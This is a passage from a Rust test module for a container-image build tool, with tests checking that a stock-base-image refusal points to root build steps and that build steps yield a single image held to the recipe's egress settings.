    /// What the stock-base refusal turns away, build steps are the way
    /// round: an entry naming them passes it.
    #[tokio::test]
    async fn build_steps_are_what_the_stock_base_refusal_points_at() {
        let dir = tempfile::tempdir().unwrap();
        assert_eq!(refusal(dir.path(), &stepped(dir.path())).await, None);
        let image = Repo {
            image: Some("ghcr.io/astral-sh/uv@sha256:35b0".into()),
            build: Vec::new(),
            ..stepped(dir.path())
        };
        let refused = off_the_stock_base(&image, None).unwrap();
        assert!(refused.contains("root `build` steps"), "{refused}");
    }

    #[tokio::test]
    async fn build_steps_build_one_image_on_the_base_held_to_their_egress() {
        let dir = tempfile::tempdir().unwrap();
        let repo = dir.path().join("app");
        std::fs::create_dir_all(&repo).unwrap();
        let recipe = steps_recipe(&repo, &stepped(&repo), "localhost/base@sha256:aa")
            .await
            .unwrap();
        let builder = FakeBuilder::default();
        let id = uuid::Uuid::now_v7().to_string();
        let built = build_steps(&builder, &repo, &recipe, &id).await.unwrap();
        assert!(built.source.is_empty(), "no source image to remove with it");
        let builds = builder.builds.lock().unwrap();
        assert_eq!(builds.len(), 1, "one image, nothing layered over it");
        let (tag, containerfile, context) = &builds[0];
        assert_eq!(*tag, build_tag(&image_name(&repo), &recipe.hash, &id));
        assert_eq!(
            *containerfile,
            steps_containerfile("localhost/base@sha256:aa", &recipe.steps)
        );
        assert!(context.is_empty(), "no build context: {context:?}");
        assert_eq!(
            *builder.egress.lock().unwrap(),
            std::slice::from_ref(&recipe.steps_egress)
        );
        assert!(built.image.image.starts_with(&image_name(&repo)));
    }
}
